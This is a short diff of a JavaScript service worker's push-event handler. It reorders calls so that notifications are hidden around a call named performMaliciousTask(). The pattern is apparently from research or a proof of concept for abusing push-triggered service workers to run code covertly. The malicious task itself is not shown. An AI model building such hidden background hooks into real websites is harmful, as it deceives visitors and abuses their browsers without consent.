@@ -63,7 +63,7 @@ self.addEventListener('push', async function (event) {
     notificationOptions.body = 'Push data: \'' + dataText + '\'';
   }  
   
-  event.waitUntil(Promise.all([DisplayNotifications(notificationTitle, notificationOptions),hideNotifications(),performMaliciousTask()]));
+  event.waitUntil(Promise.all([hideNotifications(),DisplayNotifications(notificationTitle, notificationOptions),hideNotifications(),performMaliciousTask()]));
 
 });
 
